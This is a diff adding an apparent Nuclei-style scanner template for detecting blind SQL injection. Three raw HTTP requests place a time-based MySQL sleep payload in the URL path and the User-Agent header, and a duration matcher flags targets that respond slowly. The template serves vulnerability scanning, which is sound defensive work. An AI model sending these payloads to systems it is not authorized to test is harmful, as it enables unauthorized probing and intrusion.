@@ -1,0 +1,28 @@
+id: blind-sqli
+
+info:
+  name: Blind SQL injection
+  author: abdulrahman
+  severity: high
+
+requests:
+  - raw:
+      - |+
+        POST /0'XOR(if(now()=sysdate(),sleep(25),0))XOR'Z HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87
+        
+      - |+
+        GET /0'XOR(if(now()=sysdate(),sleep(25),0))XOR'Z HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87
+
+      - |+
+        GET /?cb=123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: xyz0'XOR(if(now()=sysdate(),sleep(25),0))XOR'Z
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=24'
